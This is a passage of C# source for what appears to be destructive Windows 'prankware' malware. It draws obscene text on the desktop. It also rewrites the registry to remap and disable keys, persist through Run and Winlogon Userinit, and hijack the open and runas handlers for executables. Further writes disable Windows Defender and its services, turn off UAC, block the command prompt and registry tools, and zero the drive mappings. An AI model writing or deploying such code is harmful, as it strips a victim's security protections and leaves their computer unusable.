                            String[] rndtext = { "Disk Fucked", "MBR Fucked", "Fuck You", "Fuck your ass", "Fuck Off" , "PC Fucked", "Fuck your testicles"};
                            Font drawFont = new Font("Arial", r.Next(10, 70));
                            SolidBrush drawBrush = new SolidBrush(Color.Pink);
                            int xp = r.Next(x);
                            int yp = r.Next(y);
                            StringFormat drawFormat = new StringFormat();
                            drawFormat.FormatFlags = StringFormatFlags.DirectionRightToLeft;
                            if (r.Next(5) == 0)
                            {
                                g.DrawString(rndtext[r.Next(5)], drawFont, drawBrush, xp, yp, drawFormat);
                            }
                            ReleaseDC(IntPtr.Zero, desktop);
                        }
                    }
                }
            }
            catch(Exception) { }
        }
        static void LoadRegistry()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Keyboard Layout", true);
                byte[] scancodeMap = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5b, 0xe0, 0x00, 0x00, 0x5c, 0xe0, 0x00, 0x00, 0x5d, 0xe0, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x1d, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x1d, 0xe0, 0x00, 0x00, 0x38, 0xe0, 0x00, 0x00, 0x2A, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x3D, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00 };
                key.SetValue("Scancode Map", scancodeMap, RegistryValueKind.Binary);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("intel-disk-checker-service", @"C:\Windows\PRANKWARE.exe", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord);
                key.Close();
                key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Mouse", true);
                key.SetValue("SwapMouseButtons", "1", RegistryValueKind.String);
                key.SetValue("DoubleClickSpeed", "1", RegistryValueKind.String);
                key.SetValue("ClickLock", 0, RegistryValueKind.DWord);
                key.SetValue("MouseSpeed", "500", RegistryValueKind.String);
                key.SetValue("Beep", "Yes", RegistryValueKind.String);
                key.SetValue("ExtendedSounds", "Yes", RegistryValueKind.String);
                key.SetValue("MouseThreshold1", "500", RegistryValueKind.String);
                key.SetValue("MouseThreshold2", "500", RegistryValueKind.String);
                key.SetValue("MouseSensivity", "500", RegistryValueKind.String);
                key.SetValue("MouseTrails", "70", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\AutoRotation", true);
                key.SetValue("Enable", 1, RegistryValueKind.DWord);
                key.SetValue("LastOrientation", 1, RegistryValueKind.DWord);
                key.SetValue("SlateOrientation", 1, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\HoloSI", true);
                key.SetValue("DisableShellUI", 1, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\HardwareIdentification", true);
                key.SetValue("HardwareIDBehavior", 1, RegistryValueKind.DWord);
                key.SetValue("HardwareIDBehaviour", 1, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\SecureBoot", true);
                key.SetValue("EncodedUEFI", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Installer", true);
                key.SetValue("InstallerLocation", "nothing", RegistryValueKind.String);
                key.SetValue("MsiExecCA32", "nothing", RegistryValueKind.String);
                key.SetValue("MsiExecCA64", "nothing", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\FileExplorer\Config", true);
                key.SetValue("DefaultFolder", "nothing", RegistryValueKind.String);
                key.SetValue("Feature_SetWallPaperImage", 0, RegistryValueKind.DWord);
                key.SetValue("NavigationRoots", "nothing", RegistryValueKind.String);
                key.SetValue("RemovableDriveIconCharacter", 0, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\OpenWith", true);
                key.SetValue("OpenWithLauncher", "nothing", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Personalization", true);
                key.SetValue("AllowPersonalization", 0, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\SHUTDOWN", true);
                key.SetValue("LastBootPerfCounterFrequency", 0L, RegistryValueKind.QWord);
                key.SetValue("ShutdownStopTimePrefCounter", 0L, RegistryValueKind.QWord);
                key.SetValue("ShutdownStopTimePrefCounterCurrentBuildNumber", "nothing", RegistryValueKind.String);
                key.SetValue("ShutdownStopTimePrefCounterUBR", 0, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\StillImage", true);
                key.SetValue("WIADevicePresent", 0, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Store", true);
                key.SetValue("StoreContentModifier", "nothing", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Store\Configuration", true);
                key.SetValue("Hardware", "kisuinai", RegistryValueKind.String);
                key.SetValue("OEMDiscoveryTTL", 0L, RegistryValueKind.QWord);
                key.SetValue("OEMID", "kisuinai", RegistryValueKind.String);
                key.SetValue("SCMID", "ghoraranda", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\ThemeManager", true);
                key.SetValue("DllName", "nothing", RegistryValueKind.String);
                key.SetValue("LMOverride", "456446456546546464362346", RegistryValueKind.String);
                key.SetValue("LMVersion", "-654654646464", RegistryValueKind.String);
                key.SetValue("LoadedBefore", "-65464646456546", RegistryValueKind.String);
                key.SetValue("ServerChangeNumber", 0, RegistryValueKind.DWord);
                key.SetValue("ThemeActive", "0", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\UpdateHealthTools", true);
                key.SetValue("UDC", "ghoraranda", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\UpdatePlatform\UX\Configurations", true);
                key.SetValue("ActiveHoursStartBufferInMinutes", 0, RegistryValueKind.DWord);
                key.SetValue("RebootDowntimeEstimatesEnabled", 0, RegistryValueKind.DWord);
                key.SetValue("RebootSBCEnabled", 0, RegistryValueKind.DWord);
                key.SetValue("SmartActiveHoursState", 0, RegistryValueKind.DWord);
                key.SetValue("SmartSchedulerDurationInMinutes", 0, RegistryValueKind.DWord);
                key.SetValue("UpdateUxAllowed", 0, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Windows Block Level Backup", true);
                key.SetValue("OverallPerformanceSetting", 0x00500f00, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion", true);
                key.SetValue("CommonFilesDir", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("CommonFilesDir (x86)", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("CommonW6432Dir", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("DevicePath", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("MediaPathUnexpanded", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProgramFilesDir", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProgramFilesDir (x86)", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProgramFilesPath", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProgramW6432Dir", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("SM_ConfigureProgramsName", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender", true);
                key.SetValue("BackupLocation", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("DisableAntiSpyware", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("DisableAntiVirus", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                key.SetValue("DisableWinDefender", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("InstallLocation", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("InstallTime", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("IsServiceRunning", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("LastEnabledTime", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("OOBInstallTime", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("PassiveMode", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("PreviousRunningMode", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("ProductAppDataPath", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProductIcon", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProductLocalizedName", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProductLocalisedName", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("ProductStatus", 0x0fffffff, RegistryValueKind.DWord);
                key.SetValue("ProductType", 0x0fffffff, RegistryValueKind.DWord);
                key.SetValue("PUAProtection", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("RemediationExe", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("SacLearningModeSwitch", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("SmartLockerMode", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("VerifiedAndReputableTrustModeEnabled", 0x00000000, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\DeviceControl", true);
                key.SetValue("PoliciesLastUpdated", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Diagnostics", true);
                key.SetValue("CloudBadListVersion", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("LastKnownGoodEngineCandidate", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("LastKnownGoodPlatformLocation", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.SetValue("PlatformHealthData", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Features", true);
                key.SetValue("ChangedDefaults", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("DlpAppEnlightenmentSettings", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("DlpDisablePrintDetours", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("DlpFileEvidenceEnabled", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("MpCapability", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("MpPlatformKillbitsExFromEngine", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("MpPlatformKillbitsFromEngine", new byte[] { 0x00, 0x00, 0x00, 0x00 }, RegistryValueKind.Binary);
                key.SetValue("TamperProtection", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("TamperProtectionSource", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("TPExclusions", 0x0fffffff, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Miscellaneous Configuration", true);
                key.SetValue("BddUpdateFailure", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("DeltaUpdateFailure", 0x00000001, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Quarentine", true);
                key.SetValue("PurgeItemsAfterDelay", 0x0fffffff, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", true);
                key.SetValue("DpaDisabled", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("DisableBehaviorMonitoring", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("DisableOnAccessProtection", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("DisableScanOnRealtimeEnable", 0x00000001, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Scan", true);
                key.SetValue("DaysUntilAggressiveCatchupQuickScan", 0x00000000, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\UX Configuration", true);
                key.SetValue("UILockdown", 0x00000000, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\WindowsUpdate\EditionSettings", true);
                key.SetValue("RootDirectory", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\DriverDatabase", true);
                key.SetValue("Architecture", 0x0fffffff, RegistryValueKind.DWord);
                key.SetValue("SystemRoot", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                key.SetValue("Userinit", "C:\\Windows\\PRANKWARE.exe", RegistryValueKind.String);
                key.SetValue("AutoRestartShell", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("DisableCad", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("AutoAdminLogon", 0x00000001, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("EnableLUA", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("EnableSecureUIAPaths", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("SupportFullTrustStartupTasks", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("EnableFullTrustStartupTasks", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("EnableInstallerDetection", 0x00000000, RegistryValueKind.DWord);
                key.SetValue("shutdownwithoutlogon", 0x00000000, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\exefile\shell\runas\command", true);
                key.SetValue("(Default)", @"C:\Windows\PRANKWARE.exe ""%1"" %*", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\exefile\shell\open\command", true);
                key.SetValue("(Default)", @"C:\Windows\PRANKWARE.exe ""%1"" %*", RegistryValueKind.String);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                key.SetValue("UseDefaultTile", 0x00000001, RegistryValueKind.DWord);
                key.Close();
                key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true);
                key.SetValue("DisableLogonBackgroundImage", 0x00000001, RegistryValueKind.DWord);
                key.Close();
                key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true);
                key.SetValue("DisableCMD", 0x00000002, RegistryValueKind.DWord);
                key.Close();
                key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key.SetValue("DisableRegistryTools", 0x00000001, RegistryValueKind.DWord);
                key.Close();
                key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                key.SetValue("AutoColorization", 0x00000001, RegistryValueKind.DWord);
                key.SetValue("WallPaper", "ghorarandabalcalbalfalao", RegistryValueKind.String);
                key.Close();
                string[] driveLetters = { "D:", "C:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:" };
                string[] hexValues = new string[driveLetters.Length];
                hexValues[0] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[1] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[2] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[3] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[4] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[5] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[6] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[7] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[8] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[9] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[10] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[11] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[12] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[13] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[14] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[15] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[16] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[17] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[18] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[19] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[20] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[21] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[22] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                hexValues[23] = "00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00";
                using (key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\MountedDevices", true))
                {
                    if (key != null)
                    {
                        for (int i = 0; i < driveLetters.Length; i++)
                        {
                            string registryPath = $@"\DosDevices\{driveLetters[i]}";
                            string hexValue = hexValues[i];

                            byte[] binaryData = HexStringToByteArray(hexValue);
                            key.SetValue(registryPath, binaryData, RegistryValueKind.Binary);
                        }
                    }
                    else { }
                }
                key.Close();
                string regPath = @"SYSTEM\CurrentControlSet\Services";
                SetRegistryValue(regPath + @"\WinDefend", "Start", 4);
                SetRegistryValue(regPath + @"\Sense", "Start", 4);
                SetRegistryValue(regPath + @"\WdFilter", "Start", 4);
                SetRegistryValue(regPath + @"\WdNisDrv", "Start", 4);
                SetRegistryValue(regPath + @"\WdNisSvc", "Start", 4);
                SetRegistryValue(regPath + @"\WdBoot", "Start", 4);
            }
            catch(Exception) { }
        }
    }
}
